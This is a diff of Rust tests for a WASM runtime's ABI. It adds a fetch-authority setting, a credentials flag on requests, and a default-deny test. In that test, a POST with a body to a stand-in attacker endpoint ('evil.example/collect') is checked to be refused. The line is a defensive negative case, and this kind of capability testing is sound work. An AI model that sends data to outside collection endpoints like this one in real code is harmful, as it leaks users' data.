@@ -47,6 +47,28 @@ fn backward_compatible_consumer_version_json() -> String {
     })
 }
 
+fn runtime_create_request_json(
+    consumer_version_json: Option<&str>,
+    allow_example_fetch: bool,
+) -> String {
+    let consumer_version = consumer_version_json.map(|raw| parse_json::<WasmAbiVersion>(raw));
+    let fetch_authority = if allow_example_fetch {
+        serde_json::json!({
+            "allowedOrigins": ["https://example.com"],
+            "allowedMethods": ["GET"],
+            "allowCredentials": false,
+            "maxHeaderCount": 0
+        })
+    } else {
+        serde_json::json!({})
+    };
+    serde_json::json!({
+        "consumerVersion": consumer_version,
+        "fetchAuthority": fetch_authority
+    })
+    .to_string()
+}
+
 #[test]
 fn runtime_create_and_close_round_trip() {
     reset_dispatcher_for_tests();
@@ -208,7 +230,8 @@ fn scope_task_cancel_and_join_surface() {
 fn fetch_request_surface_and_validation() {
     reset_dispatcher_for_tests();
 
-    let runtime_json = runtime_create(None).expect("runtime_create succeeds");
+    let runtime_json = runtime_create(Some(runtime_create_request_json(None, true)))
+        .expect("runtime_create succeeds");
     let runtime: WasmHandleRef = parse_json(&runtime_json);
 
     let scope_req = WasmScopeEnterRequest {
@@ -222,6 +245,7 @@ fn fetch_request_surface_and_validation() {
         scope,
         url: "https://example.com/data".to_string(),
         method: "GET".to_string(),
+        credentials: false,
         body: None,
     };
     let fetch_json = fetch_request(to_json(&request), None).expect("fetch_request succeeds");
@@ -238,6 +262,7 @@ fn fetch_request_surface_and_validation() {
         scope,
         url: String::new(),
         method: "GET".to_string(),
+        credentials: false,
         body: None,
     };
     let err = fetch_request(to_json(&bad_request), None).expect_err("empty URL must fail");
@@ -248,6 +273,7 @@ fn fetch_request_surface_and_validation() {
         scope,
         url: "https://example.com/data".to_string(),
         method: "TRACE".to_string(),
+        credentials: false,
         body: None,
     };
     let err = fetch_request(to_json(&bad_method), None).expect_err("unsupported method must fail");
@@ -258,11 +284,55 @@ fn fetch_request_surface_and_validation() {
         scope,
         url: "https://example.com/data".to_string(),
         method: "GET".to_string(),
+        credentials: false,
         body: Some(vec![1, 2, 3]),
     };
     let err = fetch_request(to_json(&body_on_get), None).expect_err("GET body must be rejected");
     let err = error_message(err);
     assert!(err.contains("does not permit a request body"));
+}
+
+#[test]
+fn fetch_request_without_runtime_authority_fails_before_handle_allocation() {
+    reset_dispatcher_for_tests();
+
+    let runtime_json = runtime_create(None).expect("runtime_create succeeds");
+    let runtime: WasmHandleRef = parse_json(&runtime_json);
+    let scope_json = scope_enter(
+        to_json(&WasmScopeEnterRequest {
+            parent: runtime,
+            label: Some("default-deny".to_string()),
+        }),
+        None,
+    )
+    .expect("scope_enter succeeds");
+    let scope: WasmHandleRef = parse_json(&scope_json);
+    let live_before = dispatcher_diagnostics_for_tests()
+        .memory_report
+        .live_handles;
+
+    let denied = fetch_request(
+        to_json(&WasmFetchRequest {
+            scope,
+            url: "https://evil.example/collect".to_string(),
+            method: "POST".to_string(),
+            credentials: false,
+            body: Some(vec![1, 2, 3]),
+        }),
+        None,
+    )
+    .expect_err("default runtime authority must deny fetch");
+    let failure: WasmAbiFailure = parse_json(&error_message(denied));
+    assert_eq!(failure.code, WasmAbiErrorCode::CapabilityDenied);
+    assert_eq!(
+        dispatcher_diagnostics_for_tests()
+            .memory_report
+            .live_handles,
+        live_before,
+        "denied fetch must not allocate a handle"
+    );
+
+    runtime_close(runtime_json, None).expect("runtime_close succeeds");
 }
 
 #[test]
@@ -279,8 +349,12 @@ fn abi_metadata_exports_match_runtime_constants() {
 fn runtime_create_rejects_incompatible_consumer_version_at_adapter_boundary() {
     reset_dispatcher_for_tests();
 
-    let err = runtime_create(Some(incompatible_consumer_version_json()))
-        .expect_err("incompatible consumer version must fail");
+    let incompatible_version = incompatible_consumer_version_json();
+    let err = runtime_create(Some(runtime_create_request_json(
+        Some(&incompatible_version),
+        false,
+    )))
+    .expect_err("incompatible consumer version must fail");
     let err = error_message(err);
     let failure: WasmAbiFailure = parse_json(&err);
     assert_eq!(failure.code, WasmAbiErrorCode::CompatibilityRejected);
@@ -298,8 +372,11 @@ fn adapter_boundary_accepts_backward_compatible_consumer_minor() {
     reset_dispatcher_for_tests();
 
     let consumer_version_json = backward_compatible_consumer_version_json();
-    let runtime_json =
-        runtime_create(Some(consumer_version_json.clone())).expect("runtime_create succeeds");
+    let runtime_json = runtime_create(Some(runtime_create_request_json(
+        Some(&consumer_version_json),
+        true,
+    )))
+    .expect("runtime_create succeeds");
     let runtime: WasmHandleRef = parse_json(&runtime_json);
 
     let scope_json = scope_enter(
@@ -318,6 +395,7 @@ fn adapter_boundary_accepts_backward_compatible_consumer_minor() {
             scope,
             url: "https://example.com/compat".to_string(),
             method: "GET".to_string(),
+            credentials: false,
             body: None,
         }),
         Some(consumer_version_json.clone()),
@@ -1009,7 +1087,8 @@ fn websocket_url_validation_accepts_mixed_case_ws_schemes() {
 fn runtime_close_drains_open_scope_task_and_fetch_handles() {
     reset_dispatcher_for_tests();
 
-    let runtime_json = runtime_create(None).expect("runtime_create succeeds");
+    let runtime_json = runtime_create(Some(runtime_create_request_json(None, true)))
+        .expect("runtime_create succeeds");
     let runtime: WasmHandleRef = parse_json(&runtime_json);
     let scope_json = scope_enter(
         to_json(&WasmScopeEnterRequest {
@@ -1037,6 +1116,7 @@ fn runtime_close_drains_open_scope_task_and_fetch_handles() {
             scope,
             url: "https://example.com/data".to_string(),
             method: "GET".to_string(),
+            credentials: false,
             body: None,
         }),
         None,
